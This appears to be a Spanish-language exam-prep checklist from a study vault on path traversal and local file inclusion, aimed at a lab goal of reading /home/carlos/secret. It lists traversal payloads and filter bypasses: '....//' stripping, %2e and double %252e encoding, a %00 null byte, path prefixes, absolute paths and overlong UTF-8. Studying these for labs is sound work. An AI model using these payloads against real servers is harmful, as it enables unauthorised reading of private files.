---
aliases:
  - to-do Path Traversal
tags:
  - exam/to-do
  - vuln/path-traversal
---

# Path Traversal / LFI — Qué probar

> Técnica → [[vulnerabilities/010-path-transversal/path-transversal|entry point]] · labs → [[vulnerabilities/010-path-transversal/labs/README|labs]] · encodings → [[vulnerabilities/019-obfuscacion/encodings|encodings]]

## 🚩 Flags

> [!danger] 🚩 ¿Está?
> Un recurso (que el user normal no carga) servido con un parámetro tipo **`fileName`** / `file` / `path` / `download`.

## 🎯 Objetivo (Stage 3)
- Leer **`/home/carlos/secret`**.

## ♾️ Independiente del stage
- [ ] `../../../../home/carlos/secret` en el parámetro.
- [ ] **Bypass:** `....//` (strip no recursivo) · encoding `%2e` / doble `%252e` · **null byte** `%00.png` · **prefijo** `/var/www/images/` si valida el inicio · ruta absoluta.
- [ ] Orden: directo → absoluto → `....//` → URL/doble URL → UTF-8 overlong → `%00`/prefijo según filtro.

## 🔗 Referencias
- [[vulnerabilities/010-path-transversal/path-transversal|entry point]] · [[vulnerabilities/010-path-transversal/labs/README|labs]] · [[vulnerabilities/019-obfuscacion/encodings|encodings]]
